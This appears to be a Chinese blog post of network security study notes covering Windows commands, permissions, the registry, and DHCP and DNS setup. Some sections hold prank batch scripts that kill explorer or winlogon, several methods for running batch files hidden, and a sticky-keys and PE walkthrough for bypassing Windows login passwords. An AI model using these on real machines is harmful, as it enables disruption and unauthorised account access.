学习笔记","url":"/2025/01/03/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/","content":"一、windows创建定时任务参考链接\n1）通过图形化界面创建win + R 键 ： 输入： taskschd.msc   回车   -》 创建基本任务 -》 按向导操作即可\n2）通过编写脚本创建schtasks /create /tn &quot;DailyBackup&quot; /tr &quot;C:\\backup.bat&quot; /sc daily /st 08:00//其中schtasks：用于创建定时任务/tn：参数指定任务名称/tr：参数指定要执行的脚本文件路径/sc：参数指定任务执行的频率/st：参数指定任务开始的时间\n\n3）通过命令行对定时任务的一些操作schtasks /query /tn &quot;DailyBackup&quot;    #查看任务信息schtasks /delete /tn &quot;DailyBackup&quot; /f #删除任务\n\n二、linux进程被kill 后，查看原因dmesg | egrep -i -B100 &#x27;killed process&#x27; # 或者 egrep -i &#x27;killed process&#x27; /var/log/messages egrep -i -r &#x27;killed process&#x27; /var/log # 或者 journalctl -xb | egrep -i &#x27;killed process&#x27;\n\n三、安装windowsXp 和 windows2003后的优化过程1.安装系统（XP建议不要设置管理员密码）\n2.调处桌面图标\n3.安装vmware tools    （要重启）\n4.磁盘管理（创建磁盘分区）（关闭更新，关闭防火墙）\n5.做快照（建议关机后）\n6.克隆虚拟机–链接克隆–修改计算机名称–快照\n四、隐藏磁盘分区在分配盘符的时候，选择第二个选项，将其映射到别的盘下的某个文件夹（事先创建好），最后修改图标\n五、将内存中的空间用作磁盘好处：内存读取速度快，将一些程序产生的垃圾文件的目标地址指向这里，当电脑关机的时候，这些垃圾文件也会删除，电脑速度会变得较快一些，具体的教程网上搜索：需要下载类似Ramdisk的软件，用于将内存转化为硬盘使用，转化完成之后可以将浏览器的临时文件指向这里，这样电脑关机这些文件就会被删除，提高电脑的运行速度。\n六、windows命令大全#1.查看某个域名的地址信息、nslookup www.baidu.com#2.打开系统自带的画图功能,win+R  直接输入即可mspaint#3.监测延迟ping,指定发送多大的探测包ping -l 2000 www.baidu.com-t :表示一直ping-n 数字：指定发送几个探测包#4.进入文件type 文件名分页显示： | more  ; 空格表示下一页#5.查看文件dir  -&gt; dir /a#6.创建文件echo 字符串 &gt;&gt; [路径]文件名    注意：&gt;&gt; ：为追加 ； &gt; : 为覆盖#7.编辑文件copy con 文件名 -&gt; 进入编辑模式 -&gt; 回车保存 -&gt;Ctrl + C 退出#8.文件的删除del 文件名 -&gt; 批量删除：del *.扩展名  -&gt; 删除所有的文件；del . (会有提示) -&gt; 无提示删除所有的文件: del . /s /q #9.隐藏文件或文件夹隐藏：attrib +h 文件/文件夹取消隐藏：attrib -h 文件/文件夹+a :加上只读属性+s :提升为受保护的系统级文件夹#10.强制关机或重启shutdown -s -t 100  (-s 定时关机 -t 指定时间) 100s后关机shutdown -r -t 100  (-r 定时重启 -t 指定时间) 100s后重启shutdown -a 取消一切定时shutdown -r -f -t 100 (-f 强制 )shoudown -s -f -t 秒 -c &quot;字符串&quot;   字符串填写操作的原因#11.文件的移动复制文件: copy 路径+文件名 路径+文件名移动文件: move 路径+文件名 路径+文件名文件的重命名: ren 旧名 新名创建文件夹: md 名称#12.快速生成一个空文件fsutil file createnew c:\\system.ini xxx  (往c盘创建一个名为 system.ini ,大小为 xxx 的文件)#13.修改文件的关联性test.txx = exefile (以.exe来执行test.txt)  或者 test.txt = txtfile  (以.txt来执行test.txt)#14.删除文件夹rd #15.跨电脑复制文件copy 文件名 \\\\10.1.1.2\\路径#16.无视命令执行成功或报错&gt;nul 2&gt;nul#17.查看所有进程、PIDnetstat -aon查看某个端口的信息netstat -aon | findstr “端口”查看PID对应的应用程序名tasklist | findstr “PID”#18.查看当前用户的sid值whoami /user   #账户密码的存储位置: c:\\windows\\system32\\config\\SAM    (暴力破解/撞库) windows系统上，默认密码最长的有效期42天(服务器)#19.查看本机的所有开放的端口netstat -an\n\n自己编写得一些dos脚本\n#注意各个语句的用法@echo off   #关闭回显color 0a    #改变背景颜色title xin-app v1.0    #设置标题:menu        cls  echo ========================  echo      menu list:  echo   1.shutdown the computer  echo   2.cancel shutdown  echo   3.exit   echo ========================echo.   #空一行set /p num=please intput your choice:if &quot;%num%&quot; == &quot;1&quot; goto 1    #if的判断语句if &quot;%num%&quot; == &quot;2&quot; goto 2if &quot;%num%&quot; == &quot;3&quot; goto 3echo please don&#x27;t give a shit input!!!pause    #暂停goto menu      #跳转到某个代码段中:1  set /p time=please input the shutdown time (unit:s):  #读取用户输入的值，并赋值给time,  注意需要加上 /p   shutdown -s -f -t %time%       #使用%time%取出之前定义的变量time的值  goto menu:2  #代码段，一般配合goto一起使用  shutdown -a  goto menu:3  exit    #程序的退出 \n\n#恶意小dos@echo offcolor 0ataskkill /im explorer.exe /f &gt;nul 2&gt;nulecho Are you scared?ping -n 10 127.0.0.1 &gt;nul 2&gt;nulstart c:\\windows\\explorer.exeecho have fun!!!pause #恶意命令  只针对xp或win2003生效 ，win7  win10已经不生效了 ntsd -c q -pn winlogon.exe   #强制杀死指定进程 winlogon.exe 进程，该进程为windows的登陆程序，但是该进程无法杀死，导致蓝屏 taskkill /im explorer.exe /f #强制杀死指定程序 explorer.exe  /im 指定程序   /f  强制\n\n#恶意小dos:dstartgoto c:c#隐藏dos窗口的几种方法（1）mshta &quot;javascript:new ActiveXObject(&#x27;WScript.Shell&#x27;).Run(&#x27;cmd /c D:/test.bat&#x27;,0);window.close()&quot;（2）echo CreateObject(&quot;WScript.Shell&quot;).Run &quot;cmd /c D:/test.bat&quot;,0&gt;$tmp.vbs\tcscript.exe /e:vbscript $tmp.vbs\tdel $tmp.vbs（3）CreateObject(&quot;WScript.Shell&quot;).Run &quot;cmd /c D:/test.bat&quot;,0（4）利用at计划任务    用at可以建立一个计划任务，在不输入 /interactive 参数可以后台运行。但是建使用at必须有管理员权限    at 09:10 &quot;cmd /c D:/Test.bat&quot;    然后在 9:10 系统就会自动后台以SYSTEM权限运行这个bat（5）利用ftype文件关联    ftype batfile=C:/Windows/System32/mshta &quot;javascript:new ActiveXObject(&#x27;WScript.Shell&#x27;).Run(&#x27;cmd \t/c%1&#x27;,0);window.close();&quot;#让DOS一直在后运行的代码，复制的，最好检查一下再运行，或者直接在虚拟机中运行@echo oFF ::code by LZ-MyST QQ:8450919 BLOG:http://hi.baidu.com/lzmyst http://www.clxp.net.cn if &quot;%1&quot; neq &quot;1&quot; ( &gt;&quot;%temp%\\tmp.vbs&quot; echo set WshShell = WScript.CreateObject^(^&quot;WScript.Shell^&quot;^) &gt;&gt;&quot;%temp%\\tmp.vbs&quot; echo WshShell.Run chr^(34^) ^&amp; %0 ^&amp; chr^(34^) ^&amp; ^&quot; 1^&quot;,0 start /d &quot;%temp%&quot; tmp.vbs exit ) ::从这里开始，就是你的批处理代码了，DOS黑框一闪而过，转到后台运行了 pause ::你会在任务管理器看到有一个隐藏窗口的CMD进程\n\n#获取注册表中的某个键的值，仅限值为路径@echo offSetlocal enabledelayedexpansion    #延迟获取值:: 设置注册表位置set registryKey=hkcu\\control panel\\desktop    #设置需要获取的注册表的键值:: 获取 UninstallString 项的值::skip = 1 代表跳过第一行，delims=: 表示将值按:分割成多个元素:: tokens=1,*  表示将分割后的多个元素，分成两部分，第一部分为第一个元素赋值给%%i，其余元素则为第二部分,赋值给%%jfor /f &quot;skip=1 delims=: tokens=1,*&quot; %%i in (&#x27;REG QUERY &quot;%registryKey%&quot; /v &quot;wallpaper&quot;&#x27;) do (    set str=%%i    set var=%%j    :: !var:&quot;=!  表示将 var 的值中的 &quot; 替换成空    set &quot;var=!var:&quot;=!&quot;     :: ~代表切割，var:~2,-1 :从var的第三位开始截取到倒数第二位    set value=&quot;!str:~-1!:!var!&quot;):: 输出获取到的值（经过上面整个过程，就可以获取某个注册表中的某个键的路径值）echo %value%pause\n\nLinux命令大全\n\n七、网安相关知识1.用户和组的概念：​\t1.1 用户概述：​\t\t（1）每个用户登陆系统后，拥有不同的操作权限​\t\t（2）每个账户有自己唯一的SID(安全标识符)​\t\t如下所示：​\t\t前面一串数字字母都是一样的，是系统id(SID)，不同的只有最后三位（用户ID:UID）：​\t\t\t用户的UID:500​\t\t\twindows系统管理员administrator的UID是500​\t\t\t普通用户的UID是从1000开始的​\t不同的账户拥有不同的权限，为不同的账户赋予权限，也就是为不同账户的SID赋予权限\n\n​\t\t（3）用户的SID的值：whoami &#x2F;user\n​\t\t  (4) 账户密码的存储位置: c:\\windows\\system32\\config\\SAM     #暴力破解&#x2F;撞库\n​\t\t（5）windows系统上，默认密码最长的有效期42天\n​\t1.2 电脑的本地用户和组\n​\t\t电脑中的用户一般分为两种：给用户使用的和给电脑程序使用的\n​\t\t（1）给用户使用：administrator , guest    (其中前者权限较高，后者权限最低)\n​\t\t（2）给程序使用的: System, Local Service, Network Service (其中 System的权限最高)\n​\t注意：（环境为win2003服务器）可以自己在用户和组的界面添加用户（所有的用户都可以在c盘下的 “document and setting中找到”，但必须登陆之后才会生成文件夹），但是添加的用户权限不高（非常低），不能够访问其它用户的“用户文件夹”，但是“administrator” 是可以访问其它普通用户的“文件夹”，甚至普通用户连关机的权限都没有（服务器不能随便关机），只能注销账户\n与用户相关的命令（net user 开头）net user    #列出计算机的用户列表net user 用户名  #给出该用户的信息net user 用户名 1   #给用户修改密码（只有管理员能使用），密码修改为 1 net user abc 123 /add   #新建一个用户  用户名：abc  密码：123net user abc /del  #删除用户abcnet user /active:yes/no  #激活或禁用账户\n\n​\t1.3 组的概述\n​\t\t1.3.1 组的作用：简化权限的赋予，一个用户可以属于多个组，将普通用户移入管理员组，其权限也不如真正的administrator\n​\t\t权限赋予的方式：\n​\t\t\t1）用户—组—-赋权限\n​\t\t\t2）用户—赋权限\n​\t\t1.3.2 内置组\n​\t\t内置组的权限默认已经被系统赋予\n1.administrators    #管理员组2.guests\t\t\t#来宾组3.users\t\t\t\t#普通用户组（新建的用户）4.network\t\t\t#网络配置组5.print\t\t\t\t#打印组6.Remote Desktop    #远程桌面组\n\n与组相关的命令net localgroup\t\t#查看组列表net localgroup 组名\t#查看该组的成员net localgruop 组名 /add\t#创建一个新的组net localgruop 组名 用户名 /add\t\t#添加用户到组net localgroup 组名 用户名 /del\t\t#从组中踢出用户net localgroup 组名 /del\t\t\t\t#删除组\n\n2.服务器远程管理远程管理类型：远程桌面、telnet\n2.1 远程桌面步骤：1）配置网络，两台机器能够互相ping通2）服务器开启允许被远程控制：桌面属性右键—远程设置—选择允许–确定3）客户机上:win + R — 输入 mstsc4）输入ip点击确认5）输入连接服务器的账号和密码\n注意：如果使用非管理员的账户登陆远程，需要在服务器上将用户加入到远程桌面内置组 Remote Desktop Users中\n2.2 telnet步骤：1）网络配置，同上2）win+R — 输入services.msc—找到telnet服务并打开（win11需要手动添加telnet服务，然后打开）\n注意：如果使用非管理员的账户登陆远程，需要在服务器上将用户加入到telnet远程桌面内置组 Telnet Clients中\ntips:在某个区域内，一但联网获取ip之后，就能获得当前区域的网段，然后就可以对该网段的所有可用ip地址进行端口号扫描（netstat -an），看哪些ip开了某些特殊的端口（比如 telnet的端口号 23，SSH是 22，远程桌面是3389）。勒索病毒一般是通过 445 端口进来的\n2.3 破解windows密码#win7破解密码：需要系统存在某一特定的漏洞#1.第一个漏洞：连续点击五次shift键，出现粘滞键(在屏幕锁定依旧可以调用)，这个程序在 c:\\windows\\system32\\sethc.exe怎么利用：将sethc.exe替换成cmd.exe,然后通过net user 修改密码怎么替换：\t关机，在出现window图标的时候，拔掉电源，再开机，此时就会出现windows错误恢复的界面（不行就多试几次）\t然后选择启动修复---一段时间后会显示 是否还原：否-----一段时间后显示 是否将错误信息发送给微软，底下有俩个超链接\t第一个超链接是微软的官网，另一个是一个内置记事本，选择第二个打开记事本---在记事本中 文件 选项中选择 打开，就能进入文件资\t\t源管理程序-----在该程序中可以将sethc.exe替换成cmd.exe,由于没有登陆，此时打开的cmd窗口是管理员权限的#2.利用PE系统（微型维修系统）破解开机密码#原理，利用U盘启动PE系统，将原winodws中存储密码的SAM文件中的加密密码替换步骤：1）下载软件：U深度增强版（或者其它最新的PE系统）注意：在虚拟机中需要下载 PE系统的iso镜像2) 使用虚拟机的话，将光盘改成PE的iso镜像。自己的电脑的话在bios界面改成u盘启动（需要在u盘中装好PE系统，使用步骤1的软件即可）3）里面直接有一键破解密码的工具\n\n\n\n3.NTFS安全权限3.1NTFS权限概述​\t1）通过设置NTFS权限，实现不同的用户访问不同对象（文件和文件夹）的权限​\t2）分配了正确的访问权限后，用户才能访问其资源​\t3）设置权限防止资源被篡改，删除\n3.2文件系统概述​\t文件的系统即在外部存储设备上组织文件的方法\t\t若是一个分区不建立文件系统，那么该分区就无法存储数据​\t常用的文件系统：​\t\t1）FAT \t\twindows​\t\t2）NTFS\t  windows​\t\t3）EXT \t\tLinux\n3.3NTFS文件系统的特点(都是FATS不具备的)​\t1）提高磁盘的读写性能​\t2）可靠性：加密文件系统、访问控制列表（设置权限）​\t3）磁盘利用率：压缩、磁盘配额​\t4）支持单个文件大于4个g\n3.4修改NTFS权限3.4.1 取消权限继承​\t作用：取消后，可以任意修改权限列表​\t方法：文件夹右键属性–安全–高级–去掉第一个对号–选择复制即可\t\n​\t一般文件夹都会继承父文件夹的ACL，且子文件夹不能对继承过来的ACL进行修改，只有取消继承之后才可以\n3.4.2 文件及文件夹权限​\t特殊权限：控制文件夹权限列表的权限（可以赋予其它用户权限）\n3.4.3权限累加​\t当用户同时属于多个组时，权限是累加的\n3.4.5拒绝最大​\t当一个用户同属于一个有权限的组和一个无权限的组时，该用户对该文件夹无权限\n3.4.6取得所有权​\t默认只有administrator有这个权限​\t作用：可以将任何文件夹的所有者改为administrator，可以将某个用户创建的文件夹修改所有权\n3.4.7强制继承​\t作用：对下强制继承父子关系​\t方法：文件夹右键属性–安全–高级–勾上第二个对号，即可\n3.4.8文件复制对权限的影响​\t文件复制后，文件的权限会被目标文件夹的权限覆盖掉（跨分区也会），如果移动的话，权限是不会变的（若是跨分区移动，权限会被覆盖）\n4.文件共享服务器4.1共享服务器概述​\t通过网络提供文件共享服务，提供文件的下载和上传服务（类似FTP服务）\n​\t注意：其使用CIFS协议，该协议并不通用（一般在windows中使用）。一般对内使用。FTP协议是通用的，一般对外使用。\n4.2创建共享​\t方法：文件夹右键属性–共享–开启共享–设置共享名–设置共享权限\n访问：使用UNC地址win+R --- 输入 \\\\+ip --- 输入账号密码\n\n​\t注意：​\t\t1）在本地登陆时，只受NTFS权限的影响​\t\t2）在远程登陆时，将受共享及NTFS权限的共同影响，且取交集​\t\t3）建议设置共享权限为everyone完全控制，然后具体的权限在NTFS权限中设置即可\n4.3访问隐藏共享的方法​\t隐藏共享文件夹的方法：在设置名称的最后面加上一个 “$” 符号即可\n​\t访问隐藏共享文件夹的方法：\\服务器ip\\共享名$\n4.4共享相关命令net share\t\t#列出共享列表net share 共享名 /del  #删除共享net share C$:c:\\  #创建共享\n\n4.5屏蔽系统隐藏共享自动产生（c$,d$等。。）​\t步骤：​\t\t1）打开注册表：regedit​\t\t2）定位共享注册表的位置：\n​\t\t\t\t\tHKEY_Local_MACHINE\\System\\CurrentControlSet\\Services\\LanmanServer\\Parameters​\t\t\t\t\t接着右键新建 REG_DWORD类型的“AutoShareServer”键，值为 0\n4.6查看本地网络连接状态​\tnetstat -an\n4.7关闭445服务（关闭后整个共享服务都无法使用）​\t可以通过445端口来屏蔽病毒传入（比如勒索病毒等）\n​\t方法1：打开services.msc,并停止及禁用server服务\n​\t方法2：禁止被访问445。  配置高级安全防火墙—入站规则（要求win7及以上系统，win2008及以上系统），禁用访问TCP和UDP445端口\n(补充1)：注册表1.概述\n注册表是windows操作系统、硬件设备以及客户应用程序得以正常运行和保存设的核心“数据库”，也可以说是一个非常庞大的树状分层结构的数据库系统\n注册表记录了用户安装在计算机的软件和每个程序的相互关联的信息，它包括了计算机的硬件配置，包括自动配置的即插即用的设备和已有的各种设备说明、状态属性以及各种状态信息和数据。利用一个功能强大的注册表数据库来统一集中管理系统硬件设施、软件配置等信息，从而方便管理，增强系统稳定性。\n早期的注册表是由.ini为后缀的文件组成，windows 95后的注册表由多个文件组成，且提供了注册表编辑器\n\n2.注册表结构\n注册表结构以树状结构进行呈现\n子树（实际只有俩颗子树，为了方便操作，分成了5颗子树）\nHKEY_LOCAL_MACHINE：记录关于本地计算机系统的信息，包括硬件和操作系统数据\nHKEY_USERS：记录关于动态加载的用户配置文件和默认配置文件的信息（应用程序信息）\nHKEY_CURRENT_USER：HKEY_USERS子树，它指向HKEY_USERS\\当前用户的安全ID，包含当前以交互方式登陆的用户的用户配置文件\nHKEY_CURRENT_CONFIG：HKEY_LOCAL_MACHINE子树，指向HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Hardware Profiles\\Current，包含在启动时由本地计算机系统使用的硬件配置文件的相关信息加载的设备驱动程序，显示时要使用的分辨率\nHKEY_CLASS_ROOT：HKEY_CURRENT_USER子树，包含用于各种OLE技术和文件类关联数据的信息\n\n\n项\n可以简单的理解为文件夹，项中可以包含项和值\n\n\n值\n每个注册表项或子项都可以包含称为值的数据\n部分值应用于某个用户的信息\n部分值应用于计算机所有用户的信息\n值由三部分组成：值的名称、值类型、值数据\n\n\n\n\n\n3.注册表的基本操作\n创建项\n创建值（六种类型的值）\n字符串值（REG_SZ）：固定长度的文本字符串\n二进制值（REG_BINARY）：原始二进制数据。多数硬件组件信息都以二进数据存储\nDWORD值（REG_DWORD）：数据由4字节长的数表示。设备驱动程序和服务的很多参数都是这种类型\nQWORD值（REG_QWORD）：数据由8字节长的数表示\n多字符串值（REG_MUlTI_SZ）：多重字符串。包含列表或多值的值通常为该类型\n可扩充字符串值（REG_EXPAND_SZ）：长度可变的数据串。该数据类型包含在程序或服务使用该数据时解析的变量\n\n\n修改、删除和重命名值\n注册表编辑技巧\n查找字符串、值或项\n将子项添加到收藏夹\n打印注册表\n复制项名字\n\n\n\n4.注册表的维护与优化\n注册表的维护\n注册表被破坏后的常见现象\n无法启动系统\n无法运行或正常运行合法的应用程序\n找不到启动系统或运行应用程序所需的文件\n没有访问应用程序的权限\n不能正确安装或装入驱动程序\n不能进行网络连接\n注册表条目有错误\n\n\n注册表被破坏的原因\n应用程序错误：在系统中安装过多的软件后，可能会出现彼此之间的冲突\n驱动程序不兼容：安装系统时有很多驱动程序都是自动安装的，容易产生不同硬件驱动程序不兼容的情况\n硬件问题：硬件质量不行，比如内存或硬盘质量不过关造成读写错误，超频、CMOS、病毒等\n误操作：不小心误删或者添加某些值\n\n\n备份注册表\n直接将注册表进行备份：导出即可\n\n\n恢复注册表：导入即可\n锁定和解锁注册表：通过注册表修改（上网查），此时若要解锁需要借助第三方来编辑注册表，如RegWorkshop\n\n\n注册表的优化\n清除多余的DLL文件\nhk_Local_mach\\software\\micro\\win\\curVer\\SharedDLL：存放共享DLL信息，括号中的值代表共享文件的数目，若为0，可将其删除\nhk_cur_user\\software和hk_local_mach\\software：包含系统中的应用程序，对于已知的程序是知道的，删除一些未知程序及卸载程序的残留\n删除多余时区（必要情况下只保留北京）：hk_l_mach\\sof\\micro\\wind NT\\curVer\\Time Zones\n清除多余的语言代码（英语-0490、中文-0804）：h-l-m\\sys\\curContrSet\\contro\\Nis\\locale\n删除多余的键盘布局：hlm\\sys\\curContrSet\\contro\\Keyboard Layouts，每个子项代表一种键盘布局\n\n\n\n\n\n5.DHCP部署与安全5.1DHCP的作用​\t自动分配ip地址（Dynamic Host Configure Protocol）\n5.2DHCP相关概念​\t地址池&#x2F;作用域：（ip、子网掩码、网关、DNS、租期），DHCP协议端口是UDP 67&#x2F;68\n5.3DHCP优点​\t减少工作量，避免ip冲突，提高地址利用率\n5.4DHCP原理5.4.1.也称为DHCP租约过程，分为4个步骤：​\t1）客户机发送DHCP Discovery广播包​\t\t\t客户机广播请求ip地址（包含客户机的MAC地址）​\t2）服务器响应 DHCP Offer广播包​\t\t\t服务器响应提供的ip地址（但无子网掩码、网关等参数）​\t3）客户机发送DHCP Request 广播包​\t\t\t客户机选择IP（也可确认为确认使用哪个IP）​\t4）服务器发送DHCP ACK 广播包​\t\t\t服务器确定了租约，并提供网卡详细参数ip、掩码、网关、DNS、租期等\n5.4.2.DHCP 续约过程​\t\t\t当租约过了50%后，客户机会再次发送DHCP Request包，进行续约；若服务器无响应，则继续使用并在87.5%再次发送DHCP Request 包进行续约，若仍然无响应，释放地址，并重新发送DHCP Discovery 广播包来获取ip地址 \n​\t\t\t注意：若是释放地址后，重新请求DHCP服务器无响应时，此时电脑网卡会自动给自己分配一个地址（169.254.x.x&#x2F;16，但是无法上网，但能保证局域网内通信）\n5.5 部署DHCP服务器​\twindows, linux, 三层交换机 以及 路由器 等都可以作为DHCP服务器\n​\t名词：​\t\t\tDHCP选项：网关、DNS等信息，没有网关是上不了网的​\t\t\tWINS服务器：DNS上一代的产物，现在已经不用\n​\t1）IP地址固定（服务器必须固定ip地址），所以必须预留好ip​\t2）安装DHCP服务插件​\t3）新建作用域及作用域选项​\t4）激活  ： 激活之前先检查一遍​\t5）客户机验证\nipconfig /release  #释放ip 取消租约ipconfig /renew   #重新获取ip，若是已经分配ip，则该指令为续约\n\n​\t注意：释放ip的情况：1.使用release命令  2.手动配置ip\n5.6地址保留​\t在配置好的dhcp服务器上有一个 保留 的菜单，新建保留—-填写 MAC 地址—填写ip地址​\t作用：将该ip固定分配给该MAC地址的主机（服务器上实现固定ip）\n5.7DHCP备份与还原​\t1）备份​\t\t直接在配置好的服务器上右键—备份–选择路径 即可\n​\t2）还原\n​\t\t在对应的服务器上右键—-还原—-选择备份好的文件\n​\t注意：\n\n若是直接删除了服务器，则当前的dhcp服务依旧在运行，只是无法显示，但是若是将作用域删除，则该服务停止运行，若是要还原，则直接在DHCP上右键—添加服务器—查找—-选择自己服务器即可\n必须关闭防火墙，其它人才能访问服务器的67,68端口号，防火墙默认不让其他人访问这两个端口\n服务器提供的地址和提供的地址必须要在同一网段\n\n5.8选项优先级（important）​\t作用域选项 &gt; 服务器选项\n​\t注意：当服务器上有多个作用域时，可以在服务器选项上设置DNS服务器\n5.9DHCP的攻击与防御​\t1）攻击DHCP服务器：频繁发送伪装的DHCP请求，直到将DHCP池资源耗尽​\t\t  防御：在交换机上（管理型）的端口上做动态MAC地址绑定：通过网线绑定某一设备的MAC,该设备的ip不变,当该设备的MAC地址改变后，认为该设备有攻击嫌疑，不允许申请新ip。\n​\t\t动态绑定：通过网线绑定某一设备的MAC地址，但是当把网线拔掉之后，就会失效；当新设备插上网线后，就会绑定新设备的MAC地址\n​\t\t静态绑定：将某一设备的MAC直接绑定在交换机端口上（永远记住MAC地址），当新设备插上网线，会因为MAC地址不一致，导致不能上网\n​\t2）伪装DHCP服务器攻击：hack通过将自己部署为DHCP服务器，为客户机提供非法ip地址​\t\t  防御：在交换机上，除合法的DHCP服务器所在的接口外，全部设置为禁止DHCP offer包\n6.DNS部署与安全6.1DNS (Domain Name Service)​\t域名服务器​\t作用：为客户机提供域名解析服务\n6.2域名组成6.2.1域名组成概述​\t如www.sina.com.cn是一个域名，从严格意义上讲，sina.com.cn才被称为域名（全球唯一），而www是主机名。​\t主机名.域名称为完全限定域名（FQDN）。一个域名下可以有多个主机，域名全球唯一，那么主机名.域名肯定也是全球唯一。\n​\t以sina.com.cn域名为例，一般管理员在命名其主机的时候会根据其主机的功能而命名，比如网站的是的www，博客的是blog,论坛的是bbs,那么对应的FQDN为www.sina.com.cn，blog.sina.com.cn，bbs.sina.com.cn;这么多个FQDN，只需要申请一个域名sina.com.cn即可\n6.2.2域名组成​\t树形结构：（好像没有 一级域名 的说法，顶级后面就从 二级域名 开始）\n\t\t\t\t\t\t\t     根      \t     |----------------------|---------------------|             | \t\t    |\t|\t |\t  |\t   |\t    |\t|\t\t   顶级域名     aero  ...  com  net  org  edu  gov  ...  cn  uk...\t\t        |-------|------|              |------|----|二级域名\t    cctv ... ibm  huawei\t\t  bj ... edu  com             |---|----|                            |--|-------|三级域名     mail ... www                        tsinghua ... pku\t\t\t\t\t                          |--|----|四级域名                                       mail ... www其中:根域：.顶级域\t国家顶级域 cn jp hk uk\t商业顶级域\t\tcom 商业机构\t\tgov 政府机构\t\tmil 军事机构\t\tedu 教育机构\t\torg 民间组织机构\t\tnet 互联网二级域名三级域名。。。例子：www.baiud.com.  : .com为顶级域名，baidu为二级域名， www为主机名(注意最后面有个 . ，为根域)FQDN = 主机名.DNS后缀FQDN(完整合格的域名)\n\n6.2.3监听端口TCP 53UDP 53\n\n6.2.4DNS解析种类1）按照查询方式分类\n1.递归查询：客户机与本地DNS服务之间2.迭代查询：本地DNS服务器与根等其它DNS服务器的解析过程\n\n\n2）按照查询内容分类\n1.正向解析：已知域名，解析ip地址  （绝大部分用户都是正向解析）2.反向解析：已知ip地址，解析域名\n\n6.2.5DNS服务器的搭建​\t与DHCP服务器一样，在光驱上找到服务并安装即可\n​\t注意：一旦服务安装，且tcp 53端口和udp 53端口打开了，此时就已经是一台DNS服务器，因为其自带根服务器的信息，若是有主机的dns服务器地址指向该服务器，若是该服务器不能处理，会去找根服务器，且处理完之后会将结果进行缓存，因此这种无需配置的纯粹的DNS服务器也称为“缓存服务器”\n（1）搭建步骤：安装好服务之后​\t\t1）在正向查找区域（正向解析服务）—右键—新建区域​\t\t2）选择区域类型：主要区域、辅助区域、存根区域（新建选择 主要区域）​\t\t\t\t主要区域：主服务器​\t\t\t\t辅助区域：备份区域，已经存在主服务器，为了防止主服务器宕机，设置的一个备选项​\t\t\t\t存根服务器：根域，普通人员一般用不到​\t\t3）设置区域名称​\t\t\t\t比如将区域名称设置为 baidu.com,意味着该服务为这个域的权威服务器，一旦是该域下的一律由该服务器解析​\t\t4）保存区域解析文件​\t\t5）动态更新 选择 不允许动态更新​\t\t6）完成\n名词解释：（服务器中的两条记录）\n起始授权机构（SOA): 谁是某个区域名称的权威服务器（全球唯一）名称服务器（NS）:目前负责该区域名称的服务器是谁，包括备份DNS服务器通俗来说就是：SOA 说明负责区域名称为 baidu.com 的权威服务器是谁，NS说明负责区域名称为 baidu.com 的服务器有那几条台\n\n（2）创建主机​\t\t右键—新建主机—填写主机名（例如 www）— 填写ip地址—-添加主机\n（3）测试​\t\t在win2003中同时开启DHCP和DNS服务器，将DHCP服务器中的dns地址指向win2003，此时win2003同时作为DHCP和DNS服务器；接着在xp中使用 nslookup www.baidu.com命令，解析域名即可。\n​\t\t或者直接使用 ping www.baidu.com命令，也可以看到效果.。\n​\t\t注意：在解析过程中，前面的内容可能出现一些 request timed out 的字样，这是因为当我们需要向DNS服务器请求解析服务时，并不是第一时间将域名发给服务器进行解析，而是先询问服务器的域名（反向解析），由于该服务器未设置域名，因此出现上面的情况；​\t\t如何解决上述情况：​\t\t\t首先依旧创建主机，将地址设置为DNS服务器的地址，在最后添加主机的时候，勾选 创建相关的指针(PTR)记录 （忽略警告）即可；​\t\t\t接着在 反向查找区域 右键创建—–选择主要区域—–输入网络id(服务器地址：10.1.1.22，网路id：10.1.1)—-全部下一步直到完成；​\t\t\t接着在刚创建的区域右键—-创建指针—-输入主机ip（输入上一步未输入的那一位：22）—- 选择主机名（直接查找到正向区域创建的A记录）—确定即可\n​\t\t一般这种测试i需要使用命令 ipconfig /flushdns 刷新本机dns缓存\n​\t\t查看本机dns缓存内容：ipconfig /displaydns\n（4）DNS解析转发​\t\t首先在win2003-1和win2003-2各自创建一台DNS服务器，其中1用于解析 www.baidu.com，2用于解析 www.qq.com;​\t\t接着在win2003-1的DNS服务器上右键—-属性—–选择转发器菜单（这步可以查看菜单根提示，里面记载了全球的13台根服务器的地址）—– 填写转发器的ip地址（需要转发到哪台DNS服务器）—–添加即可\n（5）辅助DNS服务器的搭建与配置​\t\t首先同样需要在win2003-1和win2003-2各自创建一台DNS服务器；​\t\t接着在win2003-1的服务器的正向查找区域的baidu.com上右键（备份的是区域而不是服务器）—-属性—-选择区域复制菜单—-选择只允许到下列服务器—–添加服务器ip地址—确定即可；​\t\t接着在win2003-2上新建区域—–辅助区域—-设置名称（一般设置的和复制中的名称一致）—–设置主服务器ip—-完成\n（6）清空DNS服务器的缓存​\t\t打开DNS服务，选中对应服务器并在最上面一栏的菜单中选择 查看—-高级；接着在左边栏就会出现一项 缓存的查找;​\t\t接着对准缓存的查找右键—–清除缓存，最后将高级取消掉\n（7）别名​\t\t在某个名称域右边栏右键—-新建别名（CNAME）——设置别名—–选择目标主机的FQDN—–完成\n​\t\t作用：假如给 www.baidu.com设置了别名mamashuo，那么之后其他人通过该DNS服务器访问mamashuo.baidu.com，也能解析成功\n（8）nslookup 多重解析直接在cmd中键入 nslookup 回车，此时会进入nslookup的专属解析界面，接着每次敲域名即可直接解析若要退出：键入 exit 回车\n\n（9）创建内部DNS解析（只在内部有效）​\t\t首先按照正常流程创建一个区域，区域名称（域名）自定义。​\t\t接着在反向查找区域创建一个区域，和上面解决问题中的步骤一样。就是上诉（3）节的解决方式。\n（10）DNS服务器对域名请求的处理顺序​\t\t查看缓存—–查看自己负责的区域—–查看转发器—–根服务器\n（11）客户机域名请求解析顺序​\t\t本机DNS缓存—-本机hosts文件—找本地DNS服务器\n（12）域名解析记录类型​\t\tA记录：正向解析记录​\t\tCNAME记录：别名​\t\tPTR记录：反向解析记录​\t\tMX：邮件交换记录  ：主要用于解析邮件地址，邮箱服务器​\t\tNS：域名服务器解析\n（13）DNS服务器分类​\t\t主要名称服务器​\t\t辅助名称服务器​\t\t根名称服务器​\t\t高速缓存名称服务器：当win2003刚装好DNS服务器软件的那一刻，此时该主机就是一台高速缓存名称服务器\n7 